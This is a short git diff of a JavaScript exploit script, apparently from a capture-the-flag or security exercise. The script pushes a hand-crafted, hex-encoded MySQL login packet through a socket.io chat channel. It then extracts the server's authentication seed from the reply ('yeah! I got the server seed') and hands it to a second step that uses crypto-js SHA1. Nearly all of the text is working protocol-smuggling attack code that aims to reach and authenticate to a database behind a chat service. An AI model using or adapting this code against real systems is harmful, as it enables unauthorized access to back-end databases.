@@ -87,7 +87,7 @@ sock.on('newchat', function(data){
 	console.log(result);
 	round += 1
 	if (round == 2){
-		console.log("yeah!")
+		console.log("[+] yeah! I got the server seed")
 		var serverSeed = result.split("native_password\x00")[1].slice(0,-1);
 		step2(serverSeed);
 	}
@@ -96,18 +96,14 @@ sock.on('newchat', function(data){
 
 var password = "test123!";
 addScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js");
-//addScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/hmac.js");
 addScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/sha1.js");
 var packet = "";
 
+// step 1
 p1 = convertFromHex("c30000018da2bf0900000001ff00000000000000000000000000000000000000000000006172616e67330000746573740063616368696e675f736861325f70617373776f72640074045f706964053238373139095f706c6174666f726d067838365f3634035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c076f735f75736572056172616e670f5f636c69656e745f76657273696f6e06382e302e32330c70726f6772616d5f6e616d650573656e64746f6d65")
 
 setTimeout(function(){console.log("send 1 round");sock.emit("chatsend", p1);},500)
 setTimeout(function(){console.log("send 2 round");sock.emit("chatsend", "sendtome");},1500)
 
-
-
-//setTimeout(function(){console.log("send 3 round");sock.emit("chatsend", "sendtome");},4500)
-//setTimeout(function(){console.log("send 4 round");sock.emit("chatsend", "sendtome");},6000)
 
 
